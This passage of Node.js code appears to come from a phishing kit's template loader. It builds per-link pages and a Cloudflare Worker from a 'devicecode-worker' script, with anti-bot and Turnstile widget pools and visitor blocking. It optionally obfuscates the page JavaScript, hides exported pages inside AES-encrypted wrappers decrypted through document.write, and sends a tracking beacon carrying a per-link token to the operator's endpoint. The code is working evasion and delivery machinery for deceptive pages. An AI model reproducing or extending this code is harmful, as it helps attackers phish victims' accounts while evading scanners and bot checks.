        html = html.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
    } else {
        html = html.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
        html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
    }

    // Check if obfuscation is enabled (needed for slider overlay)
    const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;

    // ═══════════════════════════════════════════
    // INJECT SLIDER OVERLAY (if slider design selected)
    // For live pages: inject right after <body> tag
    // For export mode: inject AFTER encryption (below)
    // ═══════════════════════════════════════════
    if (isSliderDesign && !options.exportForDownload) {
        console.log('[Templateloader] Injecting slider overlay for design:', designName);
        console.log('[Templateloader] Slider data: hasHtml=' + sliderData.hasHtml + 
                    ', html length=' + (sliderData.html ? sliderData.html.length : 0) +
                    ', css length=' + (sliderData.css ? sliderData.css.length : 0) +
                    ', js length=' + (sliderData.js ? sliderData.js.length : 0));
        const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
        console.log('[Templateloader] Slider overlay built: length=' + sliderOverlay.length);
        // Count script tags in the slider overlay
        const sliderScriptCount = (sliderOverlay.match(/<script/g) || []).length;
        const sliderCloseCount = (sliderOverlay.match(/<\/script>/g) || []).length;
        console.log('[Templateloader] Slider overlay script tags: open=' + sliderScriptCount + ', close=' + sliderCloseCount);
        html = html.replace(/<body[^>]*>/i, function(match) {
            return match + sliderOverlay;
        });
        console.log('[Templateloader] Slider overlay injected after <body>');
    }

    // ═══════════════════════════════════════════
    // OBSTRUCTION: Obfuscate JS if enabled
    // ═══════════════════════════════════════════
    if (doObfuscate) {
        // Escape </script> and </style> in obfuscated JS so the browser's script tag parser
        // doesn't terminate the enclosing <script> tag prematurely. Inside JS string
        // literals, \/ is equivalent to /, so this is semantically identical but safe
        // to embed inside a <script>...</script> block.
        function safeEmbedJs(js) {
            return js.replace(/<\/script/gi, '<\\/script')
                    .replace(/<\/style/gi, '<\\/style');
        }
        // Obfuscate vg-engine.js
        if (vgEngine && vgEngine.length > 500) {
            try {
                const obfuscatedEngine = safeEmbedJs(obfuscateJs(vgEngine));
                // DEBUG: Verify safeEmbedJs actually escaped the obfuscated output
                const dbgStrayCount = (obfuscatedEngine.match(/<\/script/gi) || []).length;
                console.log('[Templateloader] DEBUG vg-engine after safeEmbedJs: length=' + obfuscatedEngine.length +
                            ', stray </script>=' + dbgStrayCount +
                            ', stray </style>=' + (obfuscatedEngine.match(/<\/style/gi) || []).length);
                if (dbgStrayCount > 0) {
                    // Find first occurrence context
                    const dbgIdx = obfuscatedEngine.search(/<\/script/gi);
                    if (dbgIdx >= 0) {
                        console.log('[Templateloader] DEBUG vg-engine first </script> context:',
                            JSON.stringify(obfuscatedEngine.substring(Math.max(0, dbgIdx - 40), dbgIdx + 40)));
                    }
                }
                const originalBlock = '<script>' + vgEngine + '</script>';
                if (html.indexOf(originalBlock) !== -1) {
                    html = html.split(originalBlock).join('<script>' + obfuscatedEngine + '</script>');
                    console.log('[Templateloader] vg-engine block replaced via exact match');
                } else {
                    const beforeLen = html.length;
                    html = html.replace(/<script>[\s\S]*?<\/script>/, '<script>' + obfuscatedEngine + '</script>');
                    console.log('[Templateloader] vg-engine block replaced via regex (html len:', beforeLen, '->', html.length, ')');
                }
                console.log('[Templateloader] VG engine obfuscated successfully');
            } catch (e) {
                console.error('[Templateloader] VG engine obfuscation failed:', e && e.message);
                console.error('[Templateloader] Obfuscation may not be installed. Run: npm install');
            }
        }
        // Obfuscate inline script
        if (script && script.length > 10) {
            try {
                const obfuscatedScript = safeEmbedJs(obfuscateJs(script));
                // DEBUG: Verify safeEmbedJs escaped the inline script too
                const inlineStrayClose = (obfuscatedScript.match(/<\/script/gi) || []).length;
                const inlineStrayOpen = (obfuscatedScript.match(/<script/gi) || []).length;
                console.log('[Templateloader] DEBUG inline script after safeEmbedJs: length=' + obfuscatedScript.length +
                            ', stray </script>=' + inlineStrayClose +
                            ', stray <script=' + inlineStrayOpen);
                
                // FIX: Instead of using a generic regex that matches the first <script> block,
                // find the specific <script> block that contains the inline script content.
                // This prevents accidentally replacing the slider overlay or vg-engine blocks.
                
                // Method 1: Exact match (fastest)
                const originalScriptBlock = '<script>' + script + '</script>';
                if (html.indexOf(originalScriptBlock) !== -1) {
                    html = html.split(originalScriptBlock).join('<script>' + obfuscatedScript + '</script>');
                    console.log('[Templateloader] Inline script block replaced via exact match');
                } else {
                    // Method 2: Find the <script> block containing the script content
                    const scriptPos = html.indexOf(script);
                    if (scriptPos !== -1) {
                        // Find the opening <script> tag before the script content
                        const scriptStart = html.lastIndexOf('<script>', scriptPos);
                        if (scriptStart !== -1) {
                            // Find the closing </script> tag after the script content
                            const scriptEnd = html.indexOf('</script>', scriptPos);
                            if (scriptEnd !== -1) {
                                // Replace only this specific block
                                const before = html.substring(0, scriptStart);
                                const after = html.substring(scriptEnd + 9); // 9 = length of '</script>'
                                html = before + '<script>' + obfuscatedScript + '</script>' + after;
                                const beforeLen = before.length + after.length + '<script></script>'.length;
                                console.log('[Templateloader] Inline script block replaced via position (html len:', beforeLen, '->', html.length, ')');
                            } else {
                                console.warn('[Templateloader] ⚠️ Inline script: found script content but no </script> tag - skipping replacement');
                            }
                        } else {
                            console.warn('[Templateloader] ⚠️ Inline script: found script content but no <script> tag - skipping replacement');
                        }
                    } else {
                        // Script content not found in HTML - this means the template loads JS externally
                        // DO NOT use fallback regex - it would replace the wrong <script> block!
                        console.warn('[Templateloader] ⚠️ Inline script: script content not found in HTML');
                        console.warn('[Templateloader] ⚠️ Template likely loads JS externally (via <script src="...">)');
                        console.warn('[Templateloader] ⚠️ Skipping inline script obfuscation to prevent HTML corruption');
                    }
                }
                console.log('[Templateloader] Inline script obfuscated successfully');
            } catch (e) {
                console.error('[Templateloader] Inline script obfuscation failed:', e && e.message);
            }
        }
    }

    // ═══════════════════════════════════════════
    // POST-OBFUSCATION SAFETY CHECK: verify no </script>
    // leaks from obfuscated JS into the enclosing
    // <script>...</script> block.
    //
    // IMPORTANT: This scanner MUST match the browser's
    // script tag parser behavior. The browser does NOT
    // track nested <script> tags inside a script block.
    // It only looks for the FIRST </script> after the
    // opening <script> to end the script block.
    //
    // So we do the same: find <script, then find the
    // next </script> after it. Anything between them
    // is part of the script block.
    // ═══════════════════════════════════════════
    {
        let idx = 0;
        let leakCount = 0;
        const leaks = [];
        
        while (idx < html.length) {
            // Find the next <script tag
            const nextOpen = html.toLowerCase().indexOf('<script', idx);
            if (nextOpen === -1) break;
            
            // Find the next </script> AFTER this <script
            const scriptEnd = html.toLowerCase().indexOf('</script>', nextOpen);
            if (scriptEnd === -1) {
                // Unclosed <script> tag - this is a problem
                console.warn('[Templateloader] ⚠️ POST-OBFUSCATION SAFETY: found unclosed <script> tag at position', nextOpen);
                console.warn('[Templateloader] ⚠️ Context:', JSON.stringify(html.substring(Math.max(0, nextOpen - 50), nextOpen + 100)));
                break;
            }
            
            // Check if there's another </script> INSIDE the script block
            // (before the actual closing tag). This would be a leak.
            let innerSearch = nextOpen + 7; // Skip past "<script"
            let innerClose = -1;
            while (innerSearch < scriptEnd) {
                const potentialClose = html.toLowerCase().indexOf('</script>', innerSearch);
                if (potentialClose === -1 || potentialClose > scriptEnd) break;
                // Found a </script> before the actual closing tag
                innerClose = potentialClose;
                break;
            }
            
            if (innerClose !== -1) {
                // This is a leak - </script> inside the script block
                leakCount++;
                leaks.push({
                    position: innerClose,
                    context: html.substring(Math.max(0, innerClose - 50), innerClose + 50)
                });
            }
            
            // Advance past the closing </script>
            idx = scriptEnd + 9;
        }
        
        if (leakCount > 0) {
            console.warn('[Templateloader] ⚠️ POST-OBFUSCATION SAFETY: found', leakCount, 'stray </script> sequence(s) INSIDE script blocks');
            console.warn('[Templateloader] ⚠️ This means obfuscated JS contains an unescaped </script> that will terminate the script block early');
            if (leaks.length > 0) {
                console.warn('[Templateloader] ⚠️ First leak at position', leaks[0].position);
                console.warn('[Templateloader] ⚠️ First leak context:', JSON.stringify(leaks[0].context));
            }
        } else {
            console.log('[Templateloader] ✓ POST-OBFUSCATION SAFETY: no stray </script> sequences detected inside script blocks');
        }
    }

    // ═══════════════════════════════════════════
    // CLEANUP: Replace any remaining placeholders BEFORE encryption
    // ═══════════════════════════════════════════
    // This ensures no {{PLACEHOLDER}} strings leak into the encrypted output
    if (html.includes('{{')) {
        console.log('[Templateloader] WARNING: Remaining placeholders found, cleaning up...');
        html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
        html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
        html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
        html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
        // Replace any other remaining placeholders with empty string
        html = html.replace(/\{\{[^}]+\}\}/g, '');
        console.log('[Templateloader] Placeholders cleaned up');
    }

    // ═══════════════════════════════════════════
    // ENCRYPTION: For download/export
    // ═══════════════════════════════════════════
    if (options.exportForDownload) {
        console.log('[Templateloader] Export mode: Starting encryption...');
        console.log('[Templateloader] HTML length before encryption:', html.length);

        // Remove beacon script for static exports (will be re-added inside encrypted payload)
        html = html.replace(/<script>fetch\([^)]*beacon[^)]*\)[^<]*<\/script>/g, '');

        // NOTE: We skip text obfuscation for exports because:
        // 1. The AES-GCM encryption already provides strong obfuscation
        // 2. The decode script doesn't execute properly after document.write()
        // 3. The JS obfuscation (if enabled) is applied before encryption
        console.log('[Templateloader] Skipping text obfuscation for exports (AES encryption is sufficient)');

        // Add beacon script INSIDE the encrypted payload so it runs AFTER decryption
        const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
        html = html.replace('</body>', beaconScript + '</body>');

        // ═══════════════════════════════════════════
        // INJECT SLIDER OVERLAY FOR EXPORT MODE (before encryption)
        // The slider overlay must be INSIDE the encrypted HTML so it survives
        // the document.write() call in the decryption wrapper
        // ═══════════════════════════════════════════
        if (isSliderDesign) {
            const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
            html = html.replace(/<body[^>]*>/i, function(match) {
                return match + sliderOverlay;
            });
            console.log('[Templateloader] Slider overlay injected before encryption for export');
        }

        // Encrypt the entire HTML payload
        try {
            const encrypted = encryptPayload(html);
            console.log('[Templateloader] Encrypted successfully');
            console.log('[Templateloader] Cipher length:', encrypted.cipher.length);
            console.log('[Templateloader] Salt:', encrypted.salt);
            console.log('[Templateloader] IV:', encrypted.iv);
            console.log('[Templateloader] Tag:', encrypted.tag);

            // Web Crypto API requires tag appended to ciphertext
            const ctBuffer = Buffer.concat([Buffer.from(encrypted.cipher, 'base64'), Buffer.from(encrypted.tag, 'base64')]);
            const ctWithTagB64 = ctBuffer.toString('base64');

            // Build the decryption wrapper
            const wrapperLines = [
                '<!DOCTYPE html>',
                '<html>',
                '<head>',
                '<meta charset="UTF-8">',
                '<style>html,body{margin:0;padding:0;height:100%;background:#fff;}</style>',
                '</head>',
                '<body>',
                '<div id="vg-decrypt-msg" style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#666;">Decrypting...</div>',
                '<script>',
                '(async function(){',
                'try{',
                'if(!window.crypto||!window.crypto.subtle){throw new Error("Web Crypto API not available");}',
                'var AAD="VG-TEMPLATE-2024";',
                'var C="' + ctWithTagB64 + '";',
                'var S="' + encrypted.salt + '";',
                'var I="' + encrypted.iv + '";',
                'var sb=Uint8Array.from(atob(S),c=>c.charCodeAt(0));',
                'var ib=Uint8Array.from(atob(I),c=>c.charCodeAt(0));',
                'var cb=Uint8Array.from(atob(C),c=>c.charCodeAt(0));',
                'var km=await crypto.subtle.importKey("raw",sb,"PBKDF2",false,["deriveKey"]);',
                'var ak=await crypto.subtle.deriveKey({name:"PBKDF2",salt:sb,iterations:100000,hash:"SHA-512"},km,{name:"AES-GCM",length:256},false,["decrypt"]);',
                'var dec=await crypto.subtle.decrypt({name:"AES-GCM",iv:ib,additionalData:new TextEncoder().encode(AAD)},ak,cb);',
                'var html=new TextDecoder().decode(dec);',
                'document.getElementById("vg-decrypt-msg").remove();',
                'document.open();document.write(html);document.close();',
                '}catch(err){',
                'var el=document.getElementById("vg-decrypt-msg");',
                'var msg="Error: "+err.message;',
                'if(err.name==="OperationError")msg="Decryption failed: Invalid key or corrupted data. Please re-download.";',
                'if(el){el.textContent=msg;el.style.color="#c00";}',
                'else{document.body.innerHTML="<div style=padding:40px;text-align:center;font-family:sans-serif;color:#c00;>"+msg+"</div>";}',
                'console.error("[VG Export] Decryption failed:",err);',
                '}',
                '})();',
                '</script>',
                '</body>',
                '</html>'
            ];

            html = wrapperLines.join('\n');
            console.log('[Templateloader] Export wrapper built, final length:', html.length);
        } catch (e) {
            console.error('[Templateloader] Encryption failed:', e && e.message);
            console.error('[Templateloader] Stack:', e && e.stack);
            throw e;
        }
    }
// Add beacon script for live pages
    const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
    html = html.replace('</body>', beaconScript + '</body>');

    // ═══════════════════════════════════════════
    // CLEANUP: Replace any remaining placeholders
    // ═══════════════════════════════════════════
    // This ensures no {{PLACEHOLDER}} strings leak into the output
    if (html.includes('{{')) {
        console.log('[Templateloader] WARNING: Remaining placeholders found, cleaning up...');
        // Replace any remaining endpoint placeholders with actual URLs
        html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
        html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
        html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
        html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
        // Replace any other remaining placeholders with empty string
        html = html.replace(/\{\{[^}]+\}\}/g, '');
        console.log('[Templateloader] Placeholders cleaned up');
    }
    
    // ═══════════════════════════════════════════
    // FINAL HTML STRUCTURE CHECK (for debugging)
    // Shows exactly what the browser will receive
    // ═══════════════════════════════════════════
    {
        const finalScriptOpen = (html.match(/<script/g) || []).length;
        const finalScriptClose = (html.match(/<\/script>/g) || []).length;
        const finalStyleOpen = (html.match(/<style/g) || []).length;
        const finalStyleClose = (html.match(/<\/style>/g) || []).length;
        
        console.log('[Templateloader] ═══ FINAL HTML STRUCTURE ═══');
        console.log('[Templateloader] Total HTML length:', html.length);
        console.log('[Templateloader] <script> tags:', finalScriptOpen);
        console.log('[Templateloader] </script> tags:', finalScriptClose);
        console.log('[Templateloader] <style> tags:', finalStyleOpen);
        console.log('[Templateloader] </style> tags:', finalStyleClose);
        console.log('[Templateloader] Script tags balanced:', finalScriptOpen === finalScriptClose);
        console.log('[Templateloader] Style tags balanced:', finalStyleOpen === finalStyleClose);
        
        // Check for </script> in string literals (would be a bug)
        const scriptContentMatches = html.match(/<script[^>]*>([\s\S]*?)<\/script>/gi) || [];
        let totalLeaks = 0;
        for (const match of scriptContentMatches) {
            const content = match.slice(7, -9); // Remove <script...> and </script>
            const leaks = (content.match(/<\/script/gi) || []).length;
            if (leaks > 0) {
                console.warn('[Templateloader] ⚠️ Found', leaks, 'stray </script> inside script block at position', html.indexOf(match));
                totalLeaks += leaks;
            }
        }
        if (totalLeaks === 0) {
            console.log('[Templateloader] ✓ No </script> leaks inside script blocks');
        }
        console.log('[Templateloader] ═══ END FINAL CHECK ═══');
    }
    
    return html;
}

// ─── Export HTML Generation ────────────────────────────────
async function generateExportHtml(link, user, options) {
    return renderPageHtml(link, user, Object.assign({}, options, { exportForDownload: true }));
}

// ─── Worker Script Builder ─────────────────────────────────
async function buildWorkerScript(link, user, apiBaseUrl) {
    console.log('[WorkerBuilder] apiBaseUrl passed:', apiBaseUrl);
    const pageHtml = await renderPageHtml(link, user, { apiBaseUrl: apiBaseUrl });
    console.log('[WorkerBuilder] pageHtml contains BEACON_ENDPOINT:', pageHtml.includes('{{BEACON_ENDPOINT}}'));
    let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
    const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
    const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });

    const escapedHtml = pageHtml
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\'")
    .replace(/"/g, '\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '')
    .replace(/\t/g, '\\t');

    // Get anti-bot settings
    let antiBotMode = 'challenge';
    let antiBotChallengeType = 'invisible';
    try {
        const settings = await loadAdminSettings();
        if (settings.anti_bot_settings) {
            try {
                const abs = JSON.parse(settings.anti_bot_settings);
                antiBotMode = abs.mode || 'challenge';
                antiBotChallengeType = abs.challengeType || 'invisible';
            } catch (e) { }
        }
    } catch (e) { }

    // ── Per-link Turnstile widget (Widget Pool) ──
    // Resolve the site_key/secret for this link's assigned widget.
    // Falls back to the global env keys for backwards compatibility.
    let tsSiteKey   = config.CF_TURNSTILE_SITE_KEY   || '';
    let tsSecretKey = config.CF_TURNSTILE_SECRET_KEY || '';
    try {
        const turnstilePool = require('./turnstile-pool');
        if (link && link.id) {
            const [sk, sk_] = await Promise.all([
                turnstilePool.getAssignedSiteKey(link.id),
                turnstilePool.getAssignedSecret(link.id),
            ]);
            if (sk)   tsSiteKey   = sk;
            if (sk_)  tsSecretKey = sk_;
        }
    } catch (e) {
        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
    }

    workerJs = workerJs
    .replace("'{{JWT_TOKEN}}'", "'" + linkJwt + "'")
    .replace("'{{TURNSTILE_KEY}}'", "'" + tsSiteKey + "'")
    .replace("'{{TURNSTILE_SECRET}}'", "'" + tsSecretKey + "'")
    .replace("'{{VERIFY_ENDPOINT}}'", "'" + verifyUrl + "'")
    .replace("'{{BEACON_ENDPOINT}}'", "'" + verifyUrl + "'")
    .replace("'{{LOG_ENDPOINT}}'", "'" + verifyUrl + "'")
    .replace("'{{ANTI_BOT_MODE}}'", "'" + antiBotMode + "'")
    .replace("'{{ANTI_BOT_CHALLENGE_TYPE}}'", "'" + antiBotChallengeType + "'")
    .replace("'{{TEMPLATE_HTML}}'", JSON.stringify(pageHtml));

    // Optionally obfuscate worker script when admin setting or link requests it
    // NOTE: Worker obfuscation is currently disabled because it breaks Cloudflare Workers
    // The obfuscator processes embedded browser code (window, document) which doesn't exist in Workers
    // TODO: Fix worker obfuscation by extracting pageHtml before obfuscation
    try {
        const settings = await loadAdminSettings();
        if (boolSetting(settings.obfuscation_enabled) || link.obfuscated) {
            // Skip worker obfuscation for now - it breaks Cloudflare Workers
            console.log('[Templateloader] Worker obfuscation skipped (compatibility issue)');
            // workerJs = obfuscateJs(workerJs);
        }
    } catch (e) {
        console.error('[Templateloader] Worker obfuscation check failed:', e.message);
    }

    return workerJs;
}

module.exports = {
    normalizeTemplateKey,
    listDiskTemplates,
    resolveTemplateDirectory,
    loadTemplateConfig,
    loadTemplateHTML,
    loadTemplateCSS,
    loadTemplateJS,
    loadVerificationDesignCSS,
    loadVerificationDesignHTML,
    hasVerificationDesignHTML,
    buildSliderOverlay,
    loadAdminSettings,
    boolSetting,
    getVisitorAccessSettings,
    checkVisitorBlocked,
    buildBlockedPage,
    generateExportHtml,
    buildWorkerScript,
};
